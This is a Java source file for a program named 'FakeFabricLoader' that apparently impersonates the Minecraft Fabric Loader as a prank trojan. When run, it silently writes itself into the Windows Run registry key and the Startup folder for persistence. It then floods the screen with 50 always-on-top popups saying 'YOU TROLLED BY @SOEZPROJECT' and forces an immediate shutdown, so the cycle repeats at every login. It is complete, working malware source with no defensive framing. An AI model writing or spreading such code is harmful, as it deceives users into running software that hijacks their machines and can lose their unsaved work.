package com.soez.fake;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.net.URI;
import java.nio.file.*;

public class FakeFabricLoader {

    private static final String MSG = "YOU TROLLED BY @SOEZPROJECT";
    private static final String TITLE = "Fabric Loader";

    public static void main(String[] args) {
        addToStartup();

        for (int i = 0; i < 50; i++) {
            final int n = i;
            new Thread(() -> {
                try { Thread.sleep(n * 150L); } catch (InterruptedException ignored) {}
                showPopup();
            }).start();
        }

        new Thread(() -> {
            try { Thread.sleep(6000); } catch (InterruptedException ignored) {}
            bsod();
        }).start();

        // Блокируем процесс, чтобы окна не закрылись сразу
        try { Thread.sleep(60000); } catch (InterruptedException ignored) {}
    }

    private static void showPopup() {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception ignored) {}

        JWindow window = new JWindow();
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBackground(Color.WHITE);
        panel.setBorder(BorderFactory.createLineBorder(new Color(180, 180, 180)));

        JPanel titleBar = new JPanel(new BorderLayout());
        titleBar.setBackground(new Color(240, 240, 240));
        JLabel titleLabel = new JLabel(" " + TITLE);
        titleLabel.setFont(new Font("Tahoma", Font.PLAIN, 12));
        JButton closeBtn = new JButton("X");
        closeBtn.setFont(new Font("Tahoma", Font.BOLD, 11));
        closeBtn.setForeground(Color.WHITE);
        closeBtn.setBackground(new Color(200, 50, 50));
        closeBtn.setBorder(BorderFactory.createEmptyBorder(2, 8, 2, 8));
        closeBtn.setFocusPainted(false);
        titleBar.add(titleLabel, BorderLayout.WEST);
        titleBar.add(closeBtn, BorderLayout.EAST);

        JPanel body = new JPanel(new BorderLayout(15, 10));
        body.setBackground(Color.WHITE);
        body.setBorder(BorderFactory.createEmptyBorder(15, 15, 15, 15));

        JLabel icon = new JLabel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                Graphics2D g2 = (Graphics2D) g;
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                g2.setColor(new Color(200, 30, 30));
                g2.fillOval(0, 0, 32, 32);
                g2.setColor(Color.WHITE);
                g2.setStroke(new BasicStroke(4));
                g2.drawLine(10, 10, 22, 22);
                g2.drawLine(22, 10, 10, 22);
            }
        };
        icon.setPreferredSize(new Dimension(32, 32));

        JLabel text = new JLabel(MSG);
        text.setFont(new Font("Tahoma", Font.PLAIN, 13));
        text.setForeground(new Color(0, 80, 160));

        body.add(icon, BorderLayout.WEST);
        body.add(text, BorderLayout.CENTER);

        JPanel bottom = new JPanel(new FlowLayout(FlowLayout.RIGHT));
        bottom.setBackground(new Color(240, 240, 240));
        JButton close = new JButton("Close");
        close.setFont(new Font("Tahoma", Font.PLAIN, 12));
        close.addActionListener(e -> window.dispose());
        bottom.add(close);

        panel.add(titleBar, BorderLayout.NORTH);
        panel.add(body, BorderLayout.CENTER);
        panel.add(bottom, BorderLayout.SOUTH);

        window.setContentPane(panel);
        window.setSize(380, 170);

        Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
        int x = (int) (Math.random() * (screen.width - 380));
        int y = (int) (Math.random() * (screen.height - 170));
        window.setLocation(x, y);
        window.setAlwaysOnTop(true);
        window.setVisible(true);

        closeBtn.addActionListener(e -> window.dispose());
    }

    private static void addToStartup() {
        try {
            String exePath = ProcessHandle.current().info().command().orElse("");
            if (exePath.isEmpty()) exePath = System.getProperty("java.class.path");

            Runtime.getRuntime().exec(new String[]{
                "reg", "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "FabricLoader",
                "/t", "REG_SZ",
                "/d", "\"" + exePath + "\"",
                "/f"
            }).waitFor();
        } catch (Exception ignored) {}

        try {
            String appdata = System.getenv("APPDATA");
            if (appdata != null) {
                Path startup = Paths.get(appdata, "Microsoft", "Windows",
                    "Start Menu", "Programs", "Startup", "FabricLoader.bat");
                String exePath = ProcessHandle.current().info().command().orElse("");
                Files.write(startup,
                    ("@echo off\nstart \"\" \"" + exePath + "\"\n").getBytes());
            }
        } catch (Exception ignored) {}
    }

    private static void bsod() {
        try {
            Runtime.getRuntime().exec("shutdown /s /f /t 0");
        } catch (Exception ignored) {}
    }
}
